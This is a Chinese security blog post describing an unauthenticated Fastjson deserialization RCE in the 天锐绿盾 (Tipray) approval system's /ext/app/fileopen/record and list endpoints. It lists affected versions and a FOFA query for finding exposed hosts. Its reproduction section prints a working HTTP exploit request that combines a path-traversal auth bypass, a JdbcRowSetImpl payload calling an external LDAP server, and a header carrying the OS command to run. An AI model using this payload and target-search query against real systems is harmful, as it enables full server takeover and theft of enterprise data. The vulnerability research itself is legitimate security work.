---
title: "天锐绿盾审批系统 /ext/app/fileopen/record、list fastjson反序列化漏洞"
source: https://mrxn.net/jswz/trwfe-fileopen-record-rce.html
asset_dir: assets/天锐绿盾审批系统-extappfileopenrecord、list-fastjson反序列化漏洞
---

# 天锐绿盾审批系统 /ext/app/fileopen/record、list fastjson反序列化漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/1/1 08:28
- 288浏览
- [0评论](#comment)
- 10分钟阅读

深入探索

数据库

代码安全审计

网络安全培训

---

# 漏洞简介

天锐绿盾审批系统是一款企业级数据防泄密（DLP）解决方案，主要用于对企业内部的敏感文件进行透明加密、权限管理以及审批流程控制，旨在防止数据泄露并保障信息安全。

漏洞修复方案

该系统的 `/ext/app/fileopen/record`以及`/ext/app/fileopen/list` 接口存在 Fastjson 反序列化漏洞。攻击者可以通过构造恶意的 JSON 数据包，利用 Fastjson 库在处理数据时存在的[反序列化](https://mrxn.net/tag/rce)缺陷，在未经授权的情况下，在服务器端执行任意代码。

成功利用此漏洞可能导致服务器被完全控制，攻击者可以窃取敏感数据、植入恶意程序、篡改系统配置，甚至对整个企业网络造成严重破坏，对企业的业务连续性和数据安全构成重大威胁。

# 影响版本

> 可通过访问 /trwfe/exports/config.ini 获取版本信息

V3.53.240913

深入探索

在线安全工具

JSON处理工具

Web安全书籍

V7.05.240904

# fofa语法

> app="TIPPAY-绿盾审批系统"
>
> Windows安全工具

# 漏洞分析

先看下fastjson的版本

[![天锐绿盾审批系统 /ext/app/fileopen/record、list fastjson反序列化漏洞](images/img-001-383ed59b4850.webp)](https://image.mrxn.net/fd52f00b7df641eb98289e3021d15cd2.webp)

1.2.7版本，不是最新版，是存在反序列化[rce](https://mrxn.net/tag/rce)漏洞的。

深入探索

Web安全课程

传输层安全性协议

漏洞扫描器

再看`/ext/app/fileopen/record` 的实现部分

[![天锐绿盾审批系统 /ext/app/fileopen/record、list fastjson反序列化漏洞](images/img-002-1a26431c06b8.webp)](https://image.mrxn.net/998ba7cdf72642adbf25773c847a762f.webp)

请求body被直接用于`JSONObject.parseArray`进行反序列化操作，非常明显的fastjson[反序列化](https://mrxn.net/tag/rce)漏洞没啥好分析的。

深入探索

安全认证考试

防火墙软件

安全工具开发

`/ext/app/fileopen/list` 亦如此

[![天锐绿盾审批系统 /ext/app/fileopen/record、list fastjson反序列化漏洞](images/img-003-db2194bac654.webp)](https://image.mrxn.net/61cebec8bfcc40ab840ba86a8b09902e.webp)

# 漏洞复现

使用`Java Chains`的`JNDILDAPDeserializePayload`下的`Fastjson反序列化链`配合`One For All Echo 回显`来完成利用

网络安全

[![天锐绿盾审批系统 /ext/app/fileopen/record、list fastjson反序列化漏洞](images/img-004-e9d4589fdd43.webp)](https://image.mrxn.net/d22bf53f00434941b693748fc91086cb.webp)

注意是数组形式的payload

```
POST /trwfe/login.jsp/.%2e/rest/ext/app/fileopen/record HTTP/1.1
Host: trwfe.mrxn.net
X-Authorization: dir
Content-Type: application/json

[
  {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://192.168.168.11:50389/165c51",
    "autoCommit": true
  }
]
```

成功执行`dir`命令 并回显[命令执行](https://mrxn.net/tag/rce)结果

[![天锐绿盾审批系统 /ext/app/fileopen/record、list fastjson反序列化漏洞](images/img-005-f5597f9be0a3.webp)](https://image.mrxn.net/db0c702ae03b47439ca6f90fc8852f1c.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
